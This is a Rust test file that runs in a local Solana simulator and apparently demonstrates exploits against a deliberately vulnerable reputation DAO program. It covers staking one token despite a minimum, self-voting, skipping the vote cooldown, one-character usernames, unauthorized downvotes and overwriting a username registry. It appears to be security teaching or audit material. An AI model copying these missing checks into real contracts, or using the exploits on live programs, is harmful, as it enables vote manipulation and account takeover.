mod utils;

use litesvm_token::{CreateAssociatedTokenAccount, CreateMint, MintTo};
use solana_sdk::{signature::Signer, transaction::Transaction};
use spl_associated_token_account::get_associated_token_address;
use utils::*;

// Test 1: Demonstrate no minimum stake requirement vulnerability
// Users can stake 1 lamport and gain voting rights (sybil attack)
#[test]
fn test_exploit_no_minimum_stake() {
    println!("\n=== EXPLOIT TEST: No Minimum Stake Enforcement ===\n");

    let mut svm = setup_svm();
    let admin = create_funded_account(&mut svm, 10_000_000_000);
    let user = create_funded_account(&mut svm, 10_000_000_000);

    println!("[Setup] Admin: {}", admin.pubkey());
    println!("[Setup] User (attacker): {}", user.pubkey());

    let mint = CreateMint::new(&mut svm, &admin)
        .decimals(DECIMALS)
        .send()
        .unwrap();

    let user_token_account = CreateAssociatedTokenAccount::new(&mut svm, &admin, &mint)
        .owner(&user.pubkey())
        .send()
        .unwrap();

    MintTo::new(&mut svm, &admin, &mint, &user_token_account, 1_000_000)
        
        .send()
        .unwrap();

    let (config_pda, _) = derive_config_pda(&admin.pubkey());
    let minimum_stake = 100_000;

    let init_dao_ix = init_dao_instruction(
        &admin.pubkey(),
        &admin.pubkey(),
        &config_pda,
        minimum_stake,
        &mint,
        5,
    );

    let tx = Transaction::new_signed_with_payer(
        &[init_dao_ix],
        Some(&admin.pubkey()),
        &[&admin],
        svm.latest_blockhash(),
    );
    svm.send_transaction(tx).unwrap();

    let (treasury_pda, _) = derive_treasury_pda(&admin.pubkey());
    let (treasury_authority, _) = derive_treasury_authority_pda(&config_pda, &admin.pubkey());
    let treasury_token_account = get_associated_token_address(&treasury_authority, &mint);

    let init_treasury_ix = initialize_treasury_instruction(
        &admin.pubkey(),
        &admin.pubkey(),
        &config_pda,
        &treasury_pda,
        &treasury_authority,
        &treasury_token_account,
        &mint,
    );

    let tx = Transaction::new_signed_with_payer(
        &[init_treasury_ix],
        Some(&admin.pubkey()),
        &[&admin],
        svm.latest_blockhash(),
    );
    svm.send_transaction(tx).unwrap();

    let (user_registry, _) = derive_user_registry_pda("alice");
    let (user_profile, _) = derive_user_profile_pda(&user.pubkey());

    let create_profile_ix =
        create_profile_instruction(&user.pubkey(), &user_registry, &user_profile, "alice");

    let tx = Transaction::new_signed_with_payer(
        &[create_profile_ix],
        Some(&user.pubkey()),
        &[&user],
        svm.latest_blockhash(),
    );
    svm.send_transaction(tx).unwrap();
    println!("[Step 1] DAO and Treasury initialized (minimum_stake = 100,000 tokens)");
    println!("[Step 2] User profile created");

    // EXPLOIT: Stake only 1 token (far below minimum_stake of 100_000)
    // In secure version this would fail with MinimumStakeRequired error
    // In vulnerable version this succeeds, allowing sybil attacks
    println!("\n[EXPLOIT] Attempting to stake only 1 token (minimum is 100,000)");
    let tiny_stake = 1;

    let stake_ix = stake_tokens_instruction(
        &user.pubkey(),
        &admin.pubkey(),
        &config_pda,
        &treasury_pda,
        &user_profile,
        &mint,
        &user_token_account,
        &treasury_token_account,
        tiny_stake,
    );

    let tx = Transaction::new_signed_with_payer(
        &[stake_ix],
        Some(&user.pubkey()),
        &[&user],
        svm.latest_blockhash(),
    );

    // This should fail but succeeds due to missing minimum stake check
    let result = svm.send_transaction(tx);
    assert!(result.is_ok(), "VULNERABILITY: User staked only 1 token and succeeded");
    println!("[EXPLOIT] SUCCESS: Staked 1 token despite 100,000 minimum!");
    println!("[VULNERABILITY] Sybil attack enabled - attacker can create many low-stake accounts");
    println!("\n=== EXPLOIT DEMONSTRATED ===\n");
}

// Test 2: Demonstrate self-voting vulnerability
// Users can vote for themselves to inflate reputation
#[test]
fn test_exploit_self_voting() {
    println!("\n=== EXPLOIT TEST: Self-Voting Allowed ===\n");

    let mut svm = setup_svm();
    let admin = create_funded_account(&mut svm, 10_000_000_000);
    let attacker = create_funded_account(&mut svm, 10_000_000_000);

    println!("[Setup] Attacker: {}", attacker.pubkey());

    let mint = CreateMint::new(&mut svm, &admin)
        .decimals(DECIMALS)
        .send()
        .unwrap();

    let attacker_token_account = CreateAssociatedTokenAccount::new(&mut svm, &admin, &mint)
        .owner(&attacker.pubkey())
        .send()
        .unwrap();

    MintTo::new(&mut svm, &admin, &mint, &attacker_token_account, 1_000_000)
        
        .send()
        .unwrap();

    let (config_pda, _) = derive_config_pda(&admin.pubkey());
    let init_dao_ix = init_dao_instruction(
        &admin.pubkey(),
        &admin.pubkey(),
        &config_pda,
        10,
        &mint,
        5,
    );

    let tx = Transaction::new_signed_with_payer(
        &[init_dao_ix],
        Some(&admin.pubkey()),
        &[&admin],
        svm.latest_blockhash(),
    );
    svm.send_transaction(tx).unwrap();

    let (treasury_pda, _) = derive_treasury_pda(&admin.pubkey());
    let (treasury_authority, _) = derive_treasury_authority_pda(&config_pda, &admin.pubkey());
    let treasury_token_account = get_associated_token_address(&treasury_authority, &mint);

    let init_treasury_ix = initialize_treasury_instruction(
        &admin.pubkey(),
        &admin.pubkey(),
        &config_pda,
        &treasury_pda,
        &treasury_authority,
        &treasury_token_account,
        &mint,
    );

    let tx = Transaction::new_signed_with_payer(
        &[init_treasury_ix],
        Some(&admin.pubkey()),
        &[&admin],
        svm.latest_blockhash(),
    );
    svm.send_transaction(tx).unwrap();

    let (attacker_registry, _) = derive_user_registry_pda("hacker");
    let (attacker_profile, _) = derive_user_profile_pda(&attacker.pubkey());

    let create_profile_ix = create_profile_instruction(
        &attacker.pubkey(),
        &attacker_registry,
        &attacker_profile,
        "hacker",
    );

    let tx = Transaction::new_signed_with_payer(
        &[create_profile_ix],
        Some(&attacker.pubkey()),
        &[&attacker],
        svm.latest_blockhash(),
    );
    svm.send_transaction(tx).unwrap();

    let stake_ix = stake_tokens_instruction(
        &attacker.pubkey(),
        &admin.pubkey(),
        &config_pda,
        &treasury_pda,
        &attacker_profile,
        &mint,
        &attacker_token_account,
        &treasury_token_account,
        100,
    );

    let tx = Transaction::new_signed_with_payer(
        &[stake_ix],
        Some(&attacker.pubkey()),
        &[&attacker],
        svm.latest_blockhash(),
    );
    svm.send_transaction(tx).unwrap();
    println!("[Step 1] Attacker staked tokens and created profile");

    // EXPLOIT: Vote for yourself
    // In secure version this would fail with CannotVoteForSelf error
    // In vulnerable version this succeeds, allowing reputation inflation
    println!("\n[EXPLOIT] Attacker votes for themselves");
    let (vote_cooldown, _) = derive_vote_cooldown_pda(&attacker.pubkey());
    let (vote_record, _) = derive_vote_record_pda(&attacker.pubkey(), "hacker");

    let upvote_ix = upvote_instruction(
        &attacker.pubkey(),
        &admin.pubkey(),
        &config_pda,
        &attacker_profile,
        &attacker_registry,
        &attacker_profile,
        &vote_cooldown,
        &vote_record,
        "hacker",
    );

    let tx = Transaction::new_signed_with_payer(
        &[upvote_ix],
        Some(&attacker.pubkey()),
        &[&attacker],
        svm.latest_blockhash(),
    );

    // This should fail but succeeds due to missing self-vote check
    let result = svm.send_transaction(tx);
    assert!(result.is_ok(), "VULNERABILITY: User voted for themselves and succeeded");
    println!("[EXPLOIT] SUCCESS: Self-vote allowed!");
    println!("[VULNERABILITY] Attacker can inflate their own reputation indefinitely");
    println!("\n=== EXPLOIT DEMONSTRATED ===\n");
}

// Test 3: Demonstrate no cooldown enforcement vulnerability
// Users can spam votes without waiting for cooldown
#[test]
fn test_exploit_no_cooldown_enforcement() {
    let mut svm = setup_svm();
    let admin = create_funded_account(&mut svm, 10_000_000_000);
    let voter = create_funded_account(&mut svm, 10_000_000_000);
    let target = create_funded_account(&mut svm, 10_000_000_000);

    let mint = CreateMint::new(&mut svm, &admin)
        .decimals(DECIMALS)
        .send()
        .unwrap();

    let voter_token_account = CreateAssociatedTokenAccount::new(&mut svm, &admin, &mint)
        .owner(&voter.pubkey())
        .send()
        .unwrap();

    MintTo::new(&mut svm, &admin, &mint, &voter_token_account, 1_000_000)
        
        .send()
        .unwrap();

    let (config_pda, _) = derive_config_pda(&admin.pubkey());
    let init_dao_ix = init_dao_instruction(
        &admin.pubkey(),
        &admin.pubkey(),
        &config_pda,
        10,
        &mint,
        5,
    );

    let tx = Transaction::new_signed_with_payer(
        &[init_dao_ix],
        Some(&admin.pubkey()),
        &[&admin],
        svm.latest_blockhash(),
    );
    svm.send_transaction(tx).unwrap();

    let (treasury_pda, _) = derive_treasury_pda(&admin.pubkey());
    let (treasury_authority, _) = derive_treasury_authority_pda(&config_pda, &admin.pubkey());
    let treasury_token_account = get_associated_token_address(&treasury_authority, &mint);

    let init_treasury_ix = initialize_treasury_instruction(
        &admin.pubkey(),
        &admin.pubkey(),
        &config_pda,
        &treasury_pda,
        &treasury_authority,
        &treasury_token_account,
        &mint,
    );

    let tx = Transaction::new_signed_with_payer(
        &[init_treasury_ix],
        Some(&admin.pubkey()),
        &[&admin],
        svm.latest_blockhash(),
    );
    svm.send_transaction(tx).unwrap();

    let (voter_registry, _) = derive_user_registry_pda("voter");
    let (voter_profile, _) = derive_user_profile_pda(&voter.pubkey());

    let create_voter_profile_ix =
        create_profile_instruction(&voter.pubkey(), &voter_registry, &voter_profile, "voter");

    let tx = Transaction::new_signed_with_payer(
        &[create_voter_profile_ix],
        Some(&voter.pubkey()),
        &[&voter],
        svm.latest_blockhash(),
    );
    svm.send_transaction(tx).unwrap();

    let (target_registry, _) = derive_user_registry_pda("target");
    let (target_profile, _) = derive_user_profile_pda(&target.pubkey());

    let create_target_profile_ix =
        create_profile_instruction(&target.pubkey(), &target_registry, &target_profile, "target");

    let tx = Transaction::new_signed_with_payer(
        &[create_target_profile_ix],
        Some(&target.pubkey()),
        &[&target],
        svm.latest_blockhash(),
    );
    svm.send_transaction(tx).unwrap();

    let stake_ix = stake_tokens_instruction(
        &voter.pubkey(),
        &admin.pubkey(),
        &config_pda,
        &treasury_pda,
        &voter_profile,
        &mint,
        &voter_token_account,
        &treasury_token_account,
        100,
    );

    let tx = Transaction::new_signed_with_payer(
        &[stake_ix],
        Some(&voter.pubkey()),
        &[&voter],
        svm.latest_blockhash(),
    );
    svm.send_transaction(tx).unwrap();

    let (vote_cooldown, _) = derive_vote_cooldown_pda(&voter.pubkey());
    let (vote_record, _) = derive_vote_record_pda(&voter.pubkey(), "target");

    let upvote_ix = upvote_instruction(
        &voter.pubkey(),
        &admin.pubkey(),
        &config_pda,
        &voter_profile,
        &target_registry,
        &target_profile,
        &vote_cooldown,
        &vote_record,
        "target",
    );

    let tx = Transaction::new_signed_with_payer(
        &[upvote_ix],
        Some(&voter.pubkey()),
        &[&voter],
        svm.latest_blockhash(),
    );
    svm.send_transaction(tx).unwrap();

    // EXPLOIT: Try to vote again immediately (should fail due to 24h cooldown for Members)
    // But vulnerable version has no cooldown check, so user can vote on different users
    let (target2_registry, _) = derive_user_registry_pda("target2");
    let target2 = create_funded_account(&mut svm, 10_000_000_000);
    let (target2_profile, _) = derive_user_profile_pda(&target2.pubkey());

    let create_target2_profile_ix = create_profile_instruction(
        &target2.pubkey(),
        &target2_registry,
        &target2_profile,
        "target2",
    );

    let tx = Transaction::new_signed_with_payer(
        &[create_target2_profile_ix],
        Some(&target2.pubkey()),
        &[&target2],
        svm.latest_blockhash(),
    );
    svm.send_transaction(tx).unwrap();

    let (vote_record2, _) = derive_vote_record_pda(&voter.pubkey(), "target2");

    let upvote_ix2 = upvote_instruction(
        &voter.pubkey(),
        &admin.pubkey(),
        &config_pda,
        &voter_profile,
        &target2_registry,
        &target2_profile,
        &vote_cooldown,
        &vote_record2,
        "target2",
    );

    let tx = Transaction::new_signed_with_payer(
        &[upvote_ix2],
        Some(&voter.pubkey()),
        &[&voter],
        svm.latest_blockhash(),
    );

    // In secure version this would fail with VoteCooldownActive error
    // In vulnerable version this succeeds immediately
    let result = svm.send_transaction(tx);
    assert!(result.is_ok(), "VULNERABILITY: User voted twice without cooldown");
}

// Test 4: Demonstrate single-character username vulnerability
#[test]
fn test_exploit_single_char_username() {
    let mut svm = setup_svm();
    let user = create_funded_account(&mut svm, 10_000_000_000);

    let (user_registry, _) = derive_user_registry_pda("a");
    let (user_profile, _) = derive_user_profile_pda(&user.pubkey());

    // EXPLOIT: Create profile with single-character username
    // In secure version this would fail with InvalidUsername error (MIN = 3)
    // In vulnerable version this succeeds (MIN = 1)
    let create_profile_ix =
        create_profile_instruction(&user.pubkey(), &user_registry, &user_profile, "a");

    let tx = Transaction::new_signed_with_payer(
        &[create_profile_ix],
        Some(&user.pubkey()),
        &[&user],
        svm.latest_blockhash(),
    );

    let result = svm.send_transaction(tx);
    assert!(result.is_ok(), "VULNERABILITY: Single-character username accepted");
}

// Test 5: Demonstrate Member rank can downvote vulnerability
#[test]
fn test_exploit_member_can_downvote() {
    let mut svm = setup_svm();
    let admin = create_funded_account(&mut svm, 10_000_000_000);
    let member = create_funded_account(&mut svm, 10_000_000_000);
    let target = create_funded_account(&mut svm, 10_000_000_000);

    let mint = CreateMint::new(&mut svm, &admin)
        .decimals(DECIMALS)
        .send()
        .unwrap();

    let member_token_account = CreateAssociatedTokenAccount::new(&mut svm, &admin, &mint)
        .owner(&member.pubkey())
        .send()
        .unwrap();

    MintTo::new(&mut svm, &admin, &mint, &member_token_account, 1_000_000)
        
        .send()
        .unwrap();

    let (config_pda, _) = derive_config_pda(&admin.pubkey());
    let init_dao_ix = init_dao_instruction(
        &admin.pubkey(),
        &admin.pubkey(),
        &config_pda,
        10,
        &mint,
        5,
    );

    let tx = Transaction::new_signed_with_payer(
        &[init_dao_ix],
        Some(&admin.pubkey()),
        &[&admin],
        svm.latest_blockhash(),
    );
    svm.send_transaction(tx).unwrap();

    let (treasury_pda, _) = derive_treasury_pda(&admin.pubkey());
    let (treasury_authority, _) = derive_treasury_authority_pda(&config_pda, &admin.pubkey());
    let treasury_token_account = get_associated_token_address(&treasury_authority, &mint);

    let init_treasury_ix = initialize_treasury_instruction(
        &admin.pubkey(),
        &admin.pubkey(),
        &config_pda,
        &treasury_pda,
        &treasury_authority,
        &treasury_token_account,
        &mint,
    );

    let tx = Transaction::new_signed_with_payer(
        &[init_treasury_ix],
        Some(&admin.pubkey()),
        &[&admin],
        svm.latest_blockhash(),
    );
    svm.send_transaction(tx).unwrap();

    let (member_registry, _) = derive_user_registry_pda("member");
    let (member_profile, _) = derive_user_profile_pda(&member.pubkey());

    let create_member_profile_ix =
        create_profile_instruction(&member.pubkey(), &member_registry, &member_profile, "member");

    let tx = Transaction::new_signed_with_payer(
        &[create_member_profile_ix],
        Some(&member.pubkey()),
        &[&member],
        svm.latest_blockhash(),
    );
    svm.send_transaction(tx).unwrap();

    let (target_registry, _) = derive_user_registry_pda("victim");
    let (target_profile, _) = derive_user_profile_pda(&target.pubkey());

    let create_target_profile_ix =
        create_profile_instruction(&target.pubkey(), &target_registry, &target_profile, "victim");

    let tx = Transaction::new_signed_with_payer(
        &[create_target_profile_ix],
        Some(&target.pubkey()),
        &[&target],
        svm.latest_blockhash(),
    );
    svm.send_transaction(tx).unwrap();

    let stake_ix = stake_tokens_instruction(
        &member.pubkey(),
        &admin.pubkey(),
        &config_pda,
        &treasury_pda,
        &member_profile,
        &mint,
        &member_token_account,
        &treasury_token_account,
        100,
    );

    let tx = Transaction::new_signed_with_payer(
        &[stake_ix],
        Some(&member.pubkey()),
        &[&member],
        svm.latest_blockhash(),
    );
    svm.send_transaction(tx).unwrap();

    // EXPLOIT: Member rank (reputation 0) tries to downvote
    // In secure version this would fail with CannotDownvote error (needs Bronze+)
    // In vulnerable version this succeeds
    let (vote_cooldown, _) = derive_vote_cooldown_pda(&member.pubkey());
    let (vote_record, _) = derive_vote_record_pda(&member.pubkey(), "victim");

    let downvote_ix = downvote_instruction(
        &member.pubkey(),
        &admin.pubkey(),
        &config_pda,
        &member_profile,
        &target_registry,
        &target_profile,
        &vote_cooldown,
        &vote_record,
        "victim",
    );

    let tx = Transaction::new_signed_with_payer(
        &[downvote_ix],
        Some(&member.pubkey()),
        &[&member],
        svm.latest_blockhash(),
    );

    let result = svm.send_transaction(tx);
    assert!(result.is_ok(), "VULNERABILITY: Member rank downvoted successfully");
}

// Test 6: Demonstrate username duplication vulnerability
// Note: This might not work as expected because PDA prevents true duplicates
// But the code doesn't check claimed flag properly
#[test]
fn test_duplicate_username_no_validation() {
    let mut svm = setup_svm();
    let user1 = create_funded_account(&mut svm, 10_000_000_000);
    let user2 = create_funded_account(&mut svm, 10_000_000_000);

    let username = "alice";
    let (user_registry, _) = derive_user_registry_pda(username);
    let (user1_profile, _) = derive_user_profile_pda(&user1.pubkey());

    let create_profile_ix1 =
        create_profile_instruction(&user1.pubkey(), &user_registry, &user1_profile, username);

    let tx = Transaction::new_signed_with_payer(
        &[create_profile_ix1],
        Some(&user1.pubkey()),
        &[&user1],
        svm.latest_blockhash(),
    );
    svm.send_transaction(tx).unwrap();

    // Try to create second profile with same username but different user
    // The registry PDA exists and claimed=true but vulnerable code overwrites it
    let (user2_profile, _) = derive_user_profile_pda(&user2.pubkey());

    let create_profile_ix2 =
        create_profile_instruction(&user2.pubkey(), &user_registry, &user2_profile, username);

    let tx = Transaction::new_signed_with_payer(
        &[create_profile_ix2],
        Some(&user2.pubkey()),
        &[&user2],
        svm.latest_blockhash(),
    );

    // This succeeds because init_if_needed allows reusing registry
    // and vulnerable code doesn't check if registry.claimed is true
    let result = svm.send_transaction(tx);
    assert!(result.is_ok(), "VULNERABILITY: Second user overwrote username registry");
}
